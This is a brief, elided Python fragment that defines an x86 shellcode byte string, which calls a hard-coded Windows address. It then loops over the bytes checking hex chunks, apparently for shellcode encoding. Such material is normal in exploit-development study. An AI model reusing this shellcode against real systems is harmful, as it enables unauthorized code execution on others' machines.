...
shellcode = (r"\x33\xC0\x50\x68\x64\x6E\x77\x70\x8B\xCC\x8B\xD4\x50\x51\x52\x50\xBE\xDE\xD8\x3B\x77\xFF\xD6\x90\x90\x90\x90\x90")
...
for i in shellcode:
    ...
    if not str(test(newchunks)).upper() == str("0x" + revhex).upper():
